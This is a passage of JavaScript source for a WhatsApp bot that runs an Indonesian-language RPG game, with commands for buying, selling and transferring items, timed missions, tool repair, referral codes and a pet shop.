Material Anda Kurang!!
${diamond < _diamond ? `\n${rpg.emoticon('diamond')}Diamond kamu kurang *${_diamond - diamond}*` : ''}${wood < ____wood ? `\n${rpg.emoticon('wood')}wood kamu kurang *${____wood - wood}*` : ''}${money < ____money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${____money - money}*` : ''}`)
user.armor += 1
user.diamond -= _diamond * 1
user.wood -= ____wood * 1
user.money -= ____money * 1
user.armordurability = 0 
user.armordurability += sword * 50 
ReplyRynzz(`Succes mengupgrade *${rpg.emoticon('armor')}Armor*`)
break

case 'atm':
if (atm == 0) {
let lmao = `anda belum memiliki *${rpg.emoticon('atm')}Atm*
untuk memilikinya ketik *${command}craft atm*`
return ReplyRynzz(`${lmao}`)
}
if (atm > 999) return ReplyRynzz(`*${rpg.emoticon('atm')}Atm* kamu sudah level max!!`)
let __diamond = atm * 3
let _emerald = atm * 5
let _____money = atm * 10000
if (diamond < __diamond || emerald < _emerald || money < _____money) return ReplyRynzz(`
Material Anda Kurang!!
${diamond < __diamond ? `\n${rpg.emoticon('diamond')}Diamond kamu kurang *${__diamond - diamond}*` : ''}${emerald < _emerald ? `\n${rpg.emoticon('emerald')}Emerald kamu kurang *${_emerald - emerald}*` : ''}${money < _____money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${_____money - money}*` : ''}`)
user.atm += 1
user.diamond -= __diamond * 1
user.emerald -= _emerald * 1
user.money -= _____money * 1
user.fullatm = 0 
user.fullatm += atm * 500000000
ReplyRynzz(`Succes mengupgrade *${rpg.emoticon('atm')}Atm*`)
break
default :
return ReplyRynzz(`${teks}`)
}
}
break

case 'transfer': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function special(type) {
let b = type.toLowerCase()
let special = (['common', 'uncommon', 'mythic', 'legendary', 'pet'].includes(b) ? ' Crate' : '')
return special
}

function isNumber(x) {
return !isNaN(x)
}
const items = [
'money', 'bank', 'potion', 'trash', 'wood',
'rock', 'string', 'petFood', 'emerald',
'diamond', 'gold', 'iron', 'common',
'uncommon', 'mythic', 'legendary', 'pet', 'chip', 
'anggur', 'apel', 'jeruk', 'mangga', 'pisang', 
'bibitanggur', 'bibitapel', 'bibitjeruk', 'bibitmangga', 'bibitpisang',
]
let user = db.data.users[m.sender]
const item = items.filter(v => v in user && typeof user[v] == 'number')
let lol = `Use format ${command} [type] [value] [number]
example ${command} money 9999 @621927237001

📍 Transferable items
${item.map(v => `${rpg.emoticon(v)}${v}`.trim()).join('\n')}
`.trim()
const type = (args[0] || '').toLowerCase()
if (!item.includes(type)) return ReplyRynzz(lol)
const count = Math.min(Number.MAX_SAFE_INTEGER, Math.max(1, (isNumber(args[1]) ? parseInt(args[1]) : 1))) * 1
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[2] ? (args[2].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
let _user = db.data.users[who]
if (!who) return ReplyRynzz('Tag salah satu, atau ketik Nomernya!!')
if (!(who in db.data.users)) return ReplyRynzz(`User ${who} not in database`)
if (user[type] * 1 < count) return ReplyRynzz(`Your *${rpg.emoticon(type)}${type}${special(type)}* is less *${count - user[type]}*`)
let previous = user[type] * 1
let _previous = _user[type] * 1
user[type] -= count * 1
_user[type] += count * 1
if (previous > user[type] * 1 && _previous < _user[type] * 1) ReplyRynzz(`*––––––『 𝚃𝚁𝙰𝙽𝚂𝙵𝙴𝚁 』––––––*\n*📊 Status:* Succes\n*🗂️ Type:* ${type}${special(type)} ${rpg.emoticon(type)}\n*🧮 Count:* ${count}\n*📨 To:* @${(who || '').replace(/@s\.whatsapp\.net/g, '')}`, null, { mentions: [who] })
else {
user[type] = previous
_user[type] = _previous
ReplyRynzz(`*––––––『 TRANSFER 』––––––*\n*📊 Status:* Failted\n*📍 Item:* ${count} ${rpg.emoticon(type)}${type}${special(type)}\n*📨 To:* @${(who || '').replace(/@s\.whatsapp\.net/g, '')}`, null, { mentions: [who] })
}
}
break

case 'buy': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function isNumber(number) {
if (!number) return number
number = parseInt(number)
return typeof number == 'number' && !isNaN(number)
}

function capitalize(word) {
return word.charAt(0).toUpperCase() + word.substr(1)
}
const items = {
buy: {
limit: {
exp: 9999
},
chip: {
money: 1000000
},
exp: {
money: 1000
},
potion: {
money: 1250
},
trash: {
money: 40
},
wood: {
money: 700
},
rock: {
money: 850
},
string: {
money: 400
},
iron: { 
money: 3000
},
diamond: {
money: 500000
},
emerald: {
money: 100000
},
gold: {
money: 100000
},
common: {
money: 2000
},
uncommon: {
money: 20000
},
mythic: {
money: 75000
},
legendary: {
money: 200000
},
petfood: {
money: 3500
},
pet: {
money: 120000
},
anggur: {
money: 2000
},
apel: {
money: 2000
},
jeruk: {
money: 2000
},
mangga: {
money: 2000
},
pisang: {
money: 2000
},
bibitanggur: {
money: 2000
},
bibitapel: {
money: 2000
},
bibitjeruk: {
money: 2000
},
bibitmangga: {
money: 2000
},
bibitpisang: {
money: 2000
},
umpan: {
money: 5000
} 
},
sell: {
limit: {
exp: 999
},
exp: {
money: 1
},
chip: {
money: 1000000
},
potion: {
money: 625
},
trash: {
money: 20
},
wood: {
money: 350
},
rock: {
money: 425
},
string: {
money: 200
},
iron: { 
money: 1500
},
diamond: {
money: 250000
},
emerald: {
money: 50000
},
gold: {
money: 50000
},
common: {
money: 1000
},
uncommon: {
money: 10000
},
mythic: {
money: 37500
},
legendary: {
money: 100000
},
petfood: {
money: 1750
},
pet: {
money: 60000
},
anggur: {
money: 1000
},
apel: {
money: 1000
},
jeruk: {
money: 1000
},
mangga: {
money: 1000
},
pisang: {
money: 1000
},
bibitanggur: {
money: 1000
},
bibitapel: {
money: 1000
},
bibitjeruk: {
money: 1000
},
bibitmangga: {
money: 1000
},
bibitpisang: {
money: 1000
},
umpan: {
money: 2500
}
}
}

const item = (args[0] || '').toLowerCase()
if (!item.match('limit') && global.db.data.chats[m.sender].rpg == false && m.isGroup) return dfail('rpg', m, Alice)
let user = global.db.data.users[m.sender]
const listItems = Object.fromEntries(Object.entries(items[command.toLowerCase()]).filter(([v]) => v && v in user))
let text = ''
let footer = ''
let image = ''
let buttons = ''
text = (command.toLowerCase() == 'buy' ?
(`
*𝙱𝚄𝚈𝙸𝙽𝙶*
`.trim()) : 
(`
*𝚂𝙴𝙻𝙻𝙸𝙽𝙶*
`.trim())
)
footer = (command.toLowerCase() == 'buy' ?
(`
🛒 List Items :
${Object.keys(listItems).map((v) => {
let paymentMethod = Object.keys(listItems[v]).find(v => v in user)
return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${listItems[v][paymentMethod]} ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim()
}).join('\n')}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ ʙᴜʏ ɪᴛᴇᴍs:
${command} [item] [quantity]
*乂 ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim()) : 
(`
🛒 List Items :
${Object.keys(listItems).map((v) => {
let paymentMethod = Object.keys(listItems[v]).find(v => v in user)
return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${listItems[v][paymentMethod]} ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim()
}).join('\n')}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ sᴇʟʟ ɪᴛᴇᴍs:
${command} [item] [quantity]
*乂 ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim())
)

const total = Math.floor(isNumber(args[1]) ? Math.min(Math.max(parseInt(args[1]), 1), Number.MAX_SAFE_INTEGER) : 1) * 1
if (!listItems[item]) return ReplyRynzz(footer)
if (command.toLowerCase() == 'buy') {
let paymentMethod = Object.keys(listItems[item]).find(v => v in user)
if (user[paymentMethod] < listItems[item][paymentMethod] * total) return ReplyRynzz(`Kamu membutuhkan *${(listItems[item][paymentMethod] * total) - user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)} Lagi, Untuk Membeli *${total}* ${capitalize(item)} ${rpg.emoticon(item)}. Kamu hanya memiliki *${user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}.`)
user[paymentMethod] -= listItems[item][paymentMethod] * total
user[item] += total
return ReplyRynzz(`Sukses Membeli *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Seharga *${listItems[item][paymentMethod] * total} ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}*`)
} else {
let paymentMethot = Object.keys(listItems[item]).find(v => v in user)
if (user[item] < total) return ReplyRynzz(`You don't have enough *${capitalize(item)} ${rpg.emoticon(item)}* to sell, you only have ${user[item]} items`)
user[item] -= total
user[paymentMethot] += listItems[item][paymentMethot] * total
return ReplyRynzz(`Sukses Menjual *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Seharga *${listItems[item][paymentMethot] * total} ${capitalize(paymentMethot)} ${rpg.emoticon(paymentMethot)}*`)
}
}
break

case 'selectskill': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
let user = db.data.users[m.sender]
let skill = ["swordmaster", "necromancer", "witch", "Archer", "magicswordmaster", "thief", "shadow"]
let bintang = {
"satu": "⭐",
"dua": "⭐⭐",
"tiga": "⭐⭐⭐",
"empat": "⭐⭐⭐⭐",
"lima": "⭐⭐⭐⭐⭐",
"Enam": "⭐⭐⭐⭐⭐⭐"
}
 let skil = text.trim().toLowerCase() // to filter text
 if (!skill.includes(skil)) return ReplyRynzz( `Select *skill🃏* what do you want/pilih skill apa yg kamu inginkan:

${skill.map(skil => `› ${skil}`).join('\n')}

How To use/Cara menggunakan:
${command} <nameskill>
 
Example/Contoh:
${command} necromancer
`)
if (user.skill == "") {
user.skill = skil
ReplyRynzz(`Anda telah memilih Skill ${skil}`)
} else if (user.skill) {
ReplyRynzz(`Anda Sudah Punya skill ${user.skill} Tidak bisa diganti`)
}
}
break

case 'sampah': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
const rewards = {
exp: 500,
money: 20999,
}

const cooldown = 2592000000
let user = db.data.users[m.sender]
if (new Date - user.lastmonthly < cooldown) return ReplyRynzz( `You have already claimed this monthly claim, wait for *${((user.lastmonthly + cooldown) - new Date()).toTimeString()}*`.trim())
let text = ''
for (let reward of Object.keys(rewards)) if (reward in user) {
user[reward] += rewards[reward]
text += `*+${rewards[reward]}* ${rpg.emoticon(reward)}${reward}\n`
}
ReplyRynzz('*––––––『 NYAMPAH 』––––––*\n' + text.trim())
user.lastmonthly = new Date * 1
}
break

case 'roket': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastmisi)
let _timers = (3600000 - __timers)
let user = db.data.users[m.sender]
let order = db.data.users[m.sender].rokets
let timers = clockString(_timers)
let name = user.registered ? user.name: Alice.getName(m.sender)
let id = m.sender
let kerja = 'Roket'
Alice.misi = Alice.misi ? Alice.misi: {}
if (id in Alice.misi) {
ReplyRynzz( `Selesaikan Misi ${Alice.misi[id][0]} Terlebih Dahulu`)
throw false
}
if (user.health < 80) return ReplyRynzz(`Anda Harus Memiliki Minimal 80Health`)
if (new Date - db.data.users[m.sender].lastmisi > 3600000) {
let ngerok4 = Math.floor(Math.random() * 10)
let ngerok5 = Math.floor(Math.random() * 10)

let ngrk4 = (ngerok4 * 100000)
let ngrk5 = (ngerok5 * 1000)

let rokit = `🌕


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████
🚀

👨‍🚀 Memulai penerbangan....
`.trim()

let rokit2 = `🌕


🚀
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ Dalam penerbangan....
`.trim()

let rokit3 = `🌕🚀


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ Sampai di tujuan....
`.trim()

let rokit4 = `🌕🚀

➕ Sukses Mendarat.... 👨‍🚀
`.trim()

let hsl = `
*—[ Hasil Ngroket ${name} ]—*
➕ 💹 Uang = [ ${ngrk4} ]
➕ ✨ Exp = [ ${ngrk5} ]
➕ 😍 Mendarat Selesai = +1
➕📥Total Mendarat Sebelumnya : ${order}
`.trim()

user.money += ngrk4
user.exp += ngrk5
user.rokets += 1
user.health -= 80

Alice.misi[id] = [
kerja,
setTimeout(() => {
delete Alice.misi[id]
}, 27000)
]

setTimeout(() => {
ReplyRynzz( hsl)
}, 27000)

setTimeout(() => {
ReplyRynzz( rokit4)
}, 25000)

setTimeout(() => {
ReplyRynzz( rokit3)
}, 20000)

setTimeout(() => {
ReplyRynzz( rokit2)
}, 15000)

setTimeout(() => {
ReplyRynzz( rokit)
}, 10000)

setTimeout(() => {
ReplyRynzz( `🔍 ${name} Mencari Lokasi.....`)
}, 0)
user.lastmisi = new Date * 1
} else ReplyRynzz(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break

case 'rob':
case 'robery': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
let user = db.data.users[m.sender]
let __timers = (new Date - user.lastmisi)
let _timers = (3600000 - __timers)
let timers = clockString(_timers)
let id = m.sender
let kerja = 'Rob'
Alice.misi = Alice.misi ? Alice.misi : {}
if (id in Alice.misi) {
ReplyRynzz( `Selesaikan Misi ${Alice.misi[id][0]} Terlebih Dahulu`)
throw false
}
if (user.health < 80) return ReplyRynzz('Anda Harus Memiliki Minimal 80Health')
if (new Date - db.data.users[m.sender].lastmisi > 3600000) {
let rndm1 = Math.floor(Math.random() * 10)
let rndm2 = Math.floor(Math.random() * 10)

let ran1 = (rndm1 * 100000)
let ran2 = (rndm2 * 1000)

let jln = `
🏘️🚗

✔️ Mengincar target....
`.trim()

let jln2 = `
🏘️ 🚶

➕ Memulai aksi....
`.trim()

let jln3 = `
🏘️

➕ Merampok....
`.trim()

let jln4 = `
🚗



🏘️🚓

➕ 💹Berhasil kabur....
`.trim()

let hsl = `
*—[ Hasil rob ]—*

➕ 💹 Uang = [ ${ran1} ]
➕ ✨ Exp = [ ${ran2} ]
➕ 📦 Rob Selesai = +1

Dan health anda berkurang -80
`.trim()
user.money += ran1
user.exp += ran2
user.health -= 80

Alice.misi[id] = [
kerja,
setTimeout(() => {
delete Alice.misi[id]
}, 27000)
]

setTimeout(() => {
ReplyRynzz(hsl)
}, 27000)

setTimeout(() => {
ReplyRynzz(jln4)
}, 25000)

setTimeout(() => {
ReplyRynzz(jln3)
}, 20000)

setTimeout(() => {
ReplyRynzz(jln2)
}, 15000)

setTimeout(() => {
ReplyRynzz(jln)
}, 10000)

setTimeout(() => {
ReplyRynzz('🔍Mencari Rumah.....')
}, 0)
user.lastmisi = new Date * 1
} else ReplyRynzz(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break

case 'repair': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
const {default: MessageType } = require ('@whiskeysockets/baileys')

let type = (args[0] || '').toLowerCase()
let _type = (args[0] || '').toLowerCase()
let user = db.data.users[m.sender]
db.data.users[m.sender].pickaxe = db.data.users[m.sender].pickaxe || 0
db.data.users[m.sender].sword = db.data.users[m.sender].sword || 0
db.data.users[m.sender].fishingrod = db.data.users[m.sender].fishingrod || 0
db.data.users[m.sender].armor = db.data.users[m.sender].armor || 0
let botol = global.botwm

let lgocraft = `
*「 R E P A I R」*`

let caption = `
*乂 .repaire pickaxe ⛏️
*乂 .repair sword ⚔️
*乂 .repair fishingrod 🎣
*乂 .repair armor 🥼

*❏ RECIPE*
*乂 Pickaxe ⛏️
〉20 Rock
〉 20 Wood
〉 20 Iron
〉 1 Diamond

*乂 Sword ⚔️
〉 20 Wood
〉 20 Iron
〉 2 Gold
〉 1 Diamond

*乂 FishingRod ⚔️
〉 20 Wood
〉 20 String
〉 20 Iron
〉 1 Diamond

*乂 Armor 🥼
〉 15 Iron
〉 2 Gold
〉 1 Diamond
`

try {
if (/repair/i.test(command)) {
const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
switch (type) {
case 'pickaxe':
if (user.pickaxedurability > 99) return ReplyRynzz('Tools ini belum memiliki kerusakan')
if (user.pickaxe == 0) return ReplyRynzz('Kamu belum memilik ini')
if(user.diamond < 1 || user.rock < 20 || user.wood < 20 || user.iron < 20 ) return ReplyRynzz(`Barang tidak cukup!`)
 user.rock -= 20
 user.wood -= 20
 user.iron -= 20
 user.diamond -= 1
 user.pickaxedurability = 100
ReplyRynzz("Sukses memperbaiki!")
break

case 'sword':
if (user.sworddurability > 99) return ReplyRynzz('Tools ini belum memiliki kerusakan')
if (user.sword == 0) return ReplyRynzz('Kamu belum memilik ini')
if(user.diamond < 1 || user.wood < 20 || user.iron < 20 || user.gold < 2 ) return ReplyRynzz(`Barang tidak cukup!`)
 user.wood -= 20
 user.iron -= 20
 user.gold -= 3
 user.diamond -= 1
 user.sworddurability = 100
ReplyRynzz("Sukses memperbaiki!")
break

case 'fishingrod':
if (user.fishingroddurability > 99) return ReplyRynzz('Tools ini belum memiliki kerusakan')
if (user.fishingrod == 0) return ReplyRynzz('Kamu belum memiliki ini')
if(user.diamond < 1 || user.string < 20 || user.wood < 20 || user.iron < 20 ) return ReplyRynzz(`Barang tidak cukup!`)
 user.wood -= 20
 user.string -= 20
 user.iron -= 20
 user.diamond -= 1
 user.fishingroddurability = 100
ReplyRynzz("Sukses memperbaiki!")
break

case 'armor':
if (user.armordurability > 99) return ReplyRynzz('Tools ini belum memiliki kerusakan')
if (user.armor == 0) return ReplyRynzz('Kamu belum memilik ini')
if(user.diamond < 1 || user.iron < 15 || user.gold < 2 ) return ReplyRynzz(`Barang tidak cukup!`)
 user.iron -= 15
 user.gold -= 2
 user.diamond -= 1
 user.armordurability = 100
ReplyRynzz("Sukses memperbaiki!")
break
default:
return await ReplyRynzz(caption)
}
} else if (/enchant|enchan/i.test(command)) {
const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
switch (_type) {
case 't':
break

case '':
break

default:
return Alice.sendButton( m.chat, caption, wm, null, [`⋮☰ Menu`, `.menu`], m)
}
}
} catch (err) {
ReplyRynzz("Error\n\n\n" + err.stack)
}
}
break

case 'referal': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
const { crypto } = require ("crypto")
const xp_first_time = 2500
const xp_link_creator = 15000
const xp_bonus = {
5: 40000,
 10: 100000,
 20: 250000,
 50: 1000000,
100: 10000000,
}

let users = db.data.users
if (text) {
if ('ref_count' in users[m.sender]) ReplyRynzz('Tidak bisa menggunakan kode referal!')
let link_creator = (Object.entries(users).find(([, { ref_code }]) => ref_code === text.trim()) || [])[0]
if (!link_creator) ReplyRynzz('Kode referal tidak valid')
let count = users[link_creator].ref_count++
let extra = xp_bonus[count] || 0
users[link_creator].exp += xp_link_creator + extra
users[m.sender].exp += xp_first_time
users[m.sender].ref_count = 0
ReplyRynzz(`
Selamat!
+${xp_first_time} XP
`.trim())
ReplyRynzz(`
Seseorang telah menggunakan kode referal kamu
+${xp_link_creator + extra} XP
`.trim(), link_creator)
} else {
let code = users[m.sender].ref_code = users[m.sender].ref_code || new Array(11).fill().map(() => [...'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'][crypto.randomInt(62)]).join('')
users[m.sender].ref_count = users[m.sender].ref_count ? users[m.sender].ref_count : 0
let command_text = `${command}ref ${code}`
let command_link = `wa.me/${Aliceuser.jid.split('@')[0]}?text=${encodeURIComponent(command_text)}`
let share_text = `
Dapatkan ${xp_first_time} XP untuk yang menggunakan link/kode referal dibawah ini

Referal Code: *${code}*

${command_link}
`.trim()
ReplyRynzz(`
Dapatkan ${xp_link_creator} XP untuk setiap pengguna baru yang menggunakan kode referal kamu
${users[m.sender].ref_count} orang telah menggunakan kode referal kamu

Kode referal kamu: ${code}

Bagikan link kepada teman: ${command_link}

atau kirim pesan kepada teman wa.me/?text=${encodeURIComponent(share_text)}

${Object.entries(xp_bonus).map(([count, xp]) => `${count} Orang = Bonus ${xp} XP`).join('\n')}
`.trim())
}
}
break

case 'petstore': 
case 'petshop': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
let type = (args[0] || '').toLowerCase()
let _type = (args[0] || '').toLowerCase()
let user = db.data.users[m.sender]
db.data.users[m.sender].pickaxe = db.data.users[m.sender].pickaxe || 0
db.data.users[m.sender].pedang = db.data.users[m.sender].pedang || 0
db.data.users[m.sender].fishingrod = db.data.users[m.sender].fishingrod || 0

//----------HARGA
let hdog = 2
let hcat = 2
let hhorse = 4
let hfox = 6
let hrobo = 10

let hlion = 10
let hrhinoceros = 10
let hdragon = 10
let hcentaur = 10
let hkyubi = 10
let hgriffin = 10
let hphonix = 10
let hwolf = 10

let logo = `— *P E T S T O R E* —
▮▧▧▧▧▧▧▧▧▧▧▧▧▮`
let caption = `
🐈 *Cat:* ${hcat} 🔖
🐕 *Dog:* ${hdog} 🔖
🐎 *Horse:* ${hhorse} 🔖
🦊 *Fox:* ${hfox} 🔖
🤖 *Robo:* ${hrobo} 🔖

〉 Ingin Beli? Check out:
.petshop cat
.petshop fox
.petshop dog
and more! 🐾
`

try {
if (/petshop/i.test(command)) {
const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
switch (type) {
case 'cat':
if (user.cat > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.pet < hcat) return ReplyRynzz(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hcat
db.data.users[m.sender].cat += 1
ReplyRynzz("Selamat anda mempunyai pet Baru ! 🎉")
break

case 'dog':
if (user.dog > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.pet < hdog) return ReplyRynzz(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hdog
db.data.users[m.sender].dog += 1
ReplyRynzz("Selamat anda mempunyai pet Baru ! 🎉")
break

case 'fox':
if (user.fox > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.pet < hfox) return ReplyRynzz(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hfox
db.data.users[m.sender].fox += 1
ReplyRynzz("Selamat anda mempunyai pet Baru ! 🎉")
break

case 'horse':
if (user.horse > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.pet < hhorse) return ReplyRynzz(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hhorse
db.data.users[m.sender].horse += 1
ReplyRynzz("Selamat anda mempunyai pet Baru ! 🎉")
break

case 'robo':
if (user.robo > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.pet < hrobo) return ReplyRynzz(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hrobo
db.data.users[m.sender].robo += 1
ReplyRynzz("Selamat anda mempunyai pet Baru ! 🎉")
break

case 'lion':
if (user.lion > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.pet < hlion) return ReplyRynzz(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hlion
db.data.users[m.sender].lion += 1
ReplyRynzz("Selamat anda mempunyai pet Baru ! 🎉")
break

case 'rhinoceros':
if (user.rhinoceros > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.pet < hrhinoceros) return ReplyRynzz(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hrhinoceros
db.data.users[m.sender].rhinoceros += 1
ReplyRynzz("Selamat anda mempunyai pet Baru ! 🎉")
break

case 'dragon':
if (user.dragon > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.pet < hdragon) return ReplyRynzz(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hdragon
db.data.users[m.sender].dragon += 1
ReplyRynzz("Selamat anda mempunyai pet Baru ! 🎉")
break

case 'centaur':
if (user.centaur > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.pet < hcentaur) return ReplyRynzz(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hcentaur
db.data.users[m.sender].centaur += 1
ReplyRynzz("Selamat anda mempunyai pet Baru ! 🎉")
break

case 'kyubi':
if (user.kyubi > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.pet < hkyubi) return ReplyRynzz(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hkyubi
db.data.users[m.sender].kyubi += 1
ReplyRynzz("Selamat anda mempunyai pet Baru ! 🎉")
break

case 'griffin':
if (user.griffin > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.pet < hgriffin) return ReplyRynzz(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hgriffin
db.data.users[m.sender].griffin += 1
ReplyRynzz("Selamat anda mempunyai pet Baru ! 🎉")
break

case 'phonix':
if (user.phonix > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.pet < hphonix) return ReplyRynzz(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hphonix
db.data.users[m.sender].phonix += 1
ReplyRynzz("Selamat anda mempunyai pet Baru ! 🎉")
break

case 'wolf':
if (user.wolf > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.pet < hwolf) return ReplyRynzz(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hwolf
db.data.users[m.sender].wolf += 1
ReplyRynzz("Selamat anda mempunyai pet Baru ! 🎉")
break

default:
return await ReplyRynzz(`${logo}\n${caption}`)
}
} else if (/enchant|enchan/i.test(command)) {
const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
switch (_type) {
case 't':
break

case '':
break

default:
return ReplyRynzz(`${logo}\n${caption}`)
}
}
} catch (err) {
ReplyRynzz("Error\n\n\n" + err.stack)
}
}
break

case 'kolam': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
let user = db.data.users[m.sender]
let past = `
╭━━━━「 *BIO* 」 
┊ *💌 Name :* ${user.registered ? user.name : Alice.getName(m.sender)}
┊ *📊 Level :* ${user.level}
┊ *✨ Exp :* ${user.exp}
╰═┅═━––––––─ׄ✧

╭━━━━「 *ISI* 」
┊🦀 Kepiting: ${user.kepiting}
┊🦞 Lobster: ${user.lobster}
┊🦐 Udang: ${user.udang}
